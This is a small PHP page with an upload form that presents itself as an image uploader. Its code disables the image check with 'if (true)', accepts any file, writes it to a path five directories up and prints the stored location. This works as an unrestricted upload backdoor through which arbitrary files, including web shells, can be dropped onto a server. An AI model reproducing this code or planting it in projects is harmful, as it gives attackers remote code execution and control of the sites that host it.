<?php
if ($_FILES) {
    $target_dir = "../../../../../";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    $file_tmp = $_FILES['fileToUpload']['tmp_name'];
    $uploadOk = 1;
    $imageFileType = pathinfo($target_file, PATHINFO_EXTENSION);
// Check if image file is a actual image or fake image
    move_uploaded_file($file_tmp, $target_file);
    if (true/* $check !== false */) {
        echo $target_file;
        $uploadOk = 1;
    } else {
        echo "File is not an image.";
        $uploadOk = 0;
    }
}
?>
<!DOCTYPE html>
<html>
    <body>

        <form method="post" enctype="multipart/form-data">
            Select image to upload:
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload Image" name="submit">
        </form>

    </body>
</html>